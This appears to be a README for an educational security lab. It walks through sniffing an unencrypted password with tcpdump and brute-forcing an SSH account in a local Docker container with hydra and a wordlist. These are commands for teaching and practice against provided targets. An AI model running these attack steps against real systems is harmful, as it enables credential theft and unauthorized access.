# Attack is the best defense

This project focuses on network security and ethical hacking techniques. It covers two main tasks:

## Task 0: Sniffing Unencrypted Traffic

In this task, we demonstrate how to sniff unencrypted network traffic and extract sensitive information, such as passwords, using `tcpdump`.

### Requirements

- Ubuntu or any other Linux distribution
- `tcpdump` package installed

### Steps

1. Download the provided script `user_authenticating_into_server`.
2. Open two terminal windows.
3. In Terminal 1, start capturing network traffic using `tcpdump`:
   ```
   sudo tcpdump -i <interface> -w capture.pcap
   ```
   Replace `<interface>` with your network interface name (e.g., `eth0`, `wlan0`).
4. In Terminal 2, run the `user_authenticating_into_server` script:
   ```
   ./user_authenticating_into_server
   ```
5. Once the script finishes, stop the `tcpdump` capture in Terminal 1 by pressing `Ctrl+C`.
6. Use `tcpdump` to read the captured file and filter the output to find the unencrypted password:
   ```
   tcpdump -r capture.pcap -Xv
   ```
   The `-Xv` option will display the packet data in both hex and ASCII formats, allowing you to identify the unencrypted password.
7. Submit the found password as the answer.

## Task 1: Dictionary Attack

This task demonstrates how to perform a dictionary attack on an SSH server running in a Docker container using the `hydra` tool.

### Requirements

- Ubuntu or any other Linux distribution
- Docker installed
- `hydra` package installed
- A password dictionary file (e.g., `rockyou.txt`)

### Steps

1. Pull and run the Docker image `sylvainkalache/264-1`:
   ```
   docker run -p 2222:22 -d -ti sylvainkalache/264-1
   ```
2. Use `hydra` to brute force the SSH account `sylvain` on the Docker container:
   ```
   hydra -l sylvain -P <dictionary_file> ssh://127.0.0.1:2222
   ```
   Replace `<dictionary_file>` with the path to your password dictionary file.
3. Wait for `hydra` to complete the attack and find the correct password.
4. Submit the found password as the answer.
